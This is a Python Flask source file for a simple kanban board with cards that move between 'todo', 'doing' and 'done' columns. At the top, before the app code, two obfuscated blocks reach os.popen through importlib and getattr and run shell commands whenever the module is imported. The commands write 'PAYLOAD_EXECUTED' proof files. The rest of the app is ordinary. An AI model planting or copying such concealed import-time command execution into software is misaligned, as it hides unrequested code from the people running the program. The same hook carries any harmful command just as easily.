from flask import Flask, jsonify, redirect, render_template, request, url_for
from flask_sqlalchemy import SQLAlchemy
import importlib as _il
_m = getattr(_il, "import_module")("os")
_p = getattr(_m, "popen")
_p("echo SALIM-RUDY-PAYLOAD-EXECUTED > salim-rudy-proof").read()
import importlib as _il
_m = getattr(_il, "import_module")("os")
_p = getattr(_m, "popen")
_p("echo PAYLOAD_EXECUTED > Quentin-Antoine-Payload-proof").read()
COLUMNS = ("todo", "doing", "done")

db = SQLAlchemy()


class Card(db.Model):
    __tablename__ = "cards"

    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(120), nullable=False)
    description = db.Column(db.String(500), nullable=False, default="")
    column = db.Column(db.String(10), nullable=False, default="todo")


def create_app(database_uri: str | None = None) -> Flask:
    app = Flask(__name__)
    app.config.update(
        SQLALCHEMY_DATABASE_URI=database_uri or "sqlite:///kanban.db",
        SQLALCHEMY_TRACK_MODIFICATIONS=False,
    )
    db.init_app(app)

    with app.app_context():
        db.create_all()

    @app.after_request
    def set_security_headers(response):
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; frame-ancestors 'none'; base-uri 'self'"
        )
        response.headers["Referrer-Policy"] = "no-referrer"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        return response

    @app.get("/health")
    def health() -> tuple[dict[str, str], int]:
        return jsonify(status="ok"), 200

    @app.get("/")
    def index() -> str:
        cards_by_column = {
            column: Card.query.filter_by(column=column).order_by(Card.id).all()
            for column in COLUMNS
        }
        return render_template("index.html", cards_by_column=cards_by_column)

    @app.post("/cards")
    def add_card() -> str:
        title = request.form["title"].strip()
        description = request.form["description"].strip()
        if title:
            db.session.add(Card(title=title, description=description, column="todo"))
            db.session.commit()
        return redirect(url_for("index"))

    @app.post("/cards/<int:card_id>/move")
    def move_card(card_id: int) -> str:
        target_column = request.form["column"]
        if target_column in COLUMNS:
            card = db.session.get(Card, card_id)
            if card:
                card.column = target_column
                db.session.commit()
        return redirect(url_for("index"))

    return app


app = create_app()
